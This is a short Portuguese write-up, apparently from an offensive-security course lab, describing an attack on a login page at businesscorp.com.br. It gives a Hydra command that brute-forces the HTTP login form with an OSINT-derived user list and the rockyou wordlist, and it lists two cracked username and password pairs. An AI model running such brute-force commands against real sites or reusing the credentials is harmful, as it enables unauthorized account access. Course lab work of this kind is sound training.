# 🔍 Exploração do Site — ☢️ Penetratium ☢️ - Team 📡

## 🔗 Materia Segurança Ofensiva 📕

- 👨‍🏫 **Professor:** JPGress
- 🔍 **Tipo:** Quebra de Hash

---
# Criar uma lista de usuarios baseado no OSINT:
<img width="375" height="281" alt="image" src="https://github.com/user-attachments/assets/8e9b1b20-e571-40d3-8ef7-971db5559727" />

- Usar o comando:

```txt
    hydra -L /home/china/Desktop/hydra/usuarios.txt -P /usr/share/wordlists/rockyou.txt businesscorp.com.br http-post-form "/app/index.php:username=^USER^&password=^PASS^:Login failed" -V -o resultados_login_app.txt
```

---
# ⚙️ Quebrando hash do ``Moikano``

<p align="center">
    <img width="772" height="439" alt="image" src="https://github.com/user-attachments/assets/0142404b-faa5-4b99-9b13-13f3af27a122" />
</p>

## 📌 Credenciais encontradas:
- Usuário: moikano
- Senha: fuck

---

# ⚙️ Quebrando hash do ``ti``

<p align="center">
    <img width="798" height="218" alt="image" src="https://github.com/user-attachments/assets/f912094c-5f32-4073-89bc-85a4a9e689a9" />
</p>

## 📌 Credenciais encontradas:
- Usuário: ti
- Senha: intranet
